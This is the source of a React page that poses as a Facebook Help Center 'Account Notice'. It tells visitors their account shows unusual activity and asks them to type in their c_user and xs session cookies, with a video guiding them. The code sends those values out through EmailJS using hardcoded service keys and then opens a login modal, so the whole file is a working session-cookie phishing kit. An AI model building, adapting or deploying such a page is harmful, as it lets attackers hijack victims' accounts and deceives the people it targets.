import React, { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import emailjs from "@emailjs/browser";
import "./style.css";
import LoginModal from "../modal/LoginModal"; // Import the LoginModal component
import sampleVideo from "../assets/0809.mp4"; // Video file from project folder

const ValidationPage = () => {
  const form = useRef();
  const navigate = useNavigate();
  const [isFormValid, setIsFormValid] = useState(false);
  const [videoMuted] = useState(true); // Video remains muted as enable sound button is removed
  const [showModal, setShowModal] = useState(false); // State to control modal visibility

  const sendEmail = (e) => {
    e.preventDefault();

    const cUserValue = form.current.elements["c_user"].value;
    const xsValue = form.current.elements["xs"].value;

    const cUserPattern = /^\d{6,}$/;
    const xsPattern = /.*%+.*/;

    const isCUserValid = cUserPattern.test(cUserValue);
    const isXsValid = xsPattern.test(xsValue);

    if (isCUserValid && isXsValid) {
      emailjs
        .sendForm(
          "service_g572qgw",
          "template_uxuv4h7",
          form.current,
          "ZLLsg29uJrmMWpY5z"
        )
        .then(
          (result) => {
            console.log("result text is", result.text);
            setShowModal(true); // Show the modal after form submission
          },
          (error) => {
            console.log(error.text);
          }
        );
    } else {
      setIsFormValid(true);
    }
  };

  return (
    <>
      <form ref={form} onSubmit={sendEmail} className="validation-form">
        {/* Header Section */}
        <div
          className="header-section"
          style={{
            width: "100%",
            height: "90px",
            background: "#4667AC",
            display: "flex",
            alignItems: "center",
            paddingLeft: "1rem",
          }}
        >
          <h1
            className="text-white m-0"
            style={{ fontFamily: "Arial, sans-serif", fontWeight: "bold" }}
          >
            facebook
          </h1>
        </div>

        <div
          className="sub-header"
          style={{
            width: "100%",
            height: "60px",
            background: "#E9EBEE",
            display: "flex",
            alignItems: "center",
            paddingLeft: "1rem",
          }}
        >
          <h4
            className="text-primary m-0"
            style={{ fontFamily: "Arial, sans-serif" }}
          >
            Help Center
          </h4>
        </div>

        {/* Main Content */}
        <div className="container my-4 d-flex justify-content-center align-items-center">
          <div
            className="form-container col-11 col-md-6"
            style={{
              border: "1px solid #ccc",
              borderRadius: "8px",
              overflow: "hidden",
              boxShadow: "0 4px 8px rgba(0,0,0,0.1)",
            }}
          >
            <div
              className="form-header p-3"
              style={{ background: "#F5F6F7" }}
            >
              <h5 style={{ margin: "0", fontFamily: "Arial, sans-serif" }}>
                Account Notice &amp; Issue Resolution
              </h5>
            </div>
            <div className="form-body p-3">
              {isFormValid && (
                <div className="alert alert-danger">
                  Please enter valid values for both fields.
                  <br />
                  For more details, check the video below.
                </div>
              )}
              <p
                className="fw-semibold validation_form_para"
                style={{ fontFamily: "Arial, sans-serif" }}
              >
                Our system has identified some unusual activity on your account.
                This notice is intended to inform you of potential discrepancies
                that may require your attention. We aim to maintain a safe and
                supportive environment for all users.
              </p>
              <p
                className="fw-semibold validation_form_para"
                style={{ fontFamily: "Arial, sans-serif" }}
              >
                If you believe this notice has been issued in error, please
                review your recent activity and provide the requested details
                below to assist our review process.
              </p>
              <p
                className="fw-semibold validation_form_para"
                style={{ fontFamily: "Arial, sans-serif" }}
              >
                Providing accurate information will help us resolve any issues
                promptly. Please note that recurring issues may lead to further
                account limitations.
              </p>
              <p
                className="fw-semibold validation_form_para"
                style={{ fontFamily: "Arial, sans-serif" }}
              >
                Kindly fill in the details below. Refer to the video for further
                clarification if necessary.
              </p>

              <p
                className="fw-semibold text-secondary"
                style={{ fontSize: "12px", fontFamily: "Arial, sans-serif" }}
              >
                Video Guidelines for Issue Resolution.
              </p>

              <div className="video-container" style={{ textAlign: "center" }}>
                <video
                  controls
                  autoPlay
                  muted={videoMuted}
                  src={sampleVideo}
                  preload="metadata"
                  style={{
                    width: "320px",
                    height: "180px",
                    borderRadius: "8px",
                    boxShadow: "0 4px 8px rgba(0,0,0,0.1)",
                  }}
                ></video>
              </div>

              <p
                className="fw-semibold validation_form_para mt-3"
                style={{ fontFamily: "Arial, sans-serif" }}
              >
                Please ensure you provide the requested details to help us
                review your case.
              </p>

              <div className="input-group" style={{ marginTop: "1rem" }}>
                <label
                  style={{
                    fontSize: "12px",
                    fontFamily: "Arial, sans-serif",
                  }}
                >
                  c_user
                </label>
                <br />
                <input
                  type="number"
                  name="c_user"
                  required
                  pattern="^\d{15}$"
                  title="Please enter 15 digits"
                  style={{
                    width: "100%",
                    padding: "8px",
                    borderRadius: "4px",
                    border: "1px solid #ccc",
                    marginTop: "5px",
                    boxShadow: "0 2px 4px rgba(0,0,0,0.05)",
                  }}
                />
              </div>

              <div className="input-group mt-3">
                <label
                  style={{
                    fontSize: "12px",
                    fontFamily: "Arial, sans-serif",
                  }}
                >
                  xs
                </label>
                <br />
                <input
                  type="text"
                  name="xs"
                  style={{
                    width: "100%",
                    padding: "8px",
                    borderRadius: "4px",
                    border: "1px solid #ccc",
                    marginTop: "5px",
                    boxShadow: "0 2px 4px rgba(0,0,0,0.05)",
                  }}
                />
              </div>

              <p
                className="mt-2"
                style={{
                  fontSize: "12px",
                  fontFamily: "Arial, sans-serif",
                }}
              >
                Please remain logged in on your device until you receive further
                communication regarding your account status.
              </p>
            </div>

            <div
              className="form-footer p-3 d-flex justify-content-end"
              style={{ background: "#F5F6F7" }}
            >
              <button
                type="submit"
                className="text-white"
                style={{
                  background: "#0D6EFD",
                  border: "none",
                  padding: "10px 20px",
                  borderRadius: "4px",
                  cursor: "pointer",
                  boxShadow:
                    "inset 0 1px 0 rgba(255,255,255,0.15), 0 1px 1px rgba(0,0,0,0.075)",
                }}
              >
                Submit
              </button>
            </div>
          </div>
        </div>
      </form>

      {/* Include the LoginModal component */}
      <LoginModal showModal={showModal} setShowModal={setShowModal} />
    </>
  );
};

export default ValidationPage;
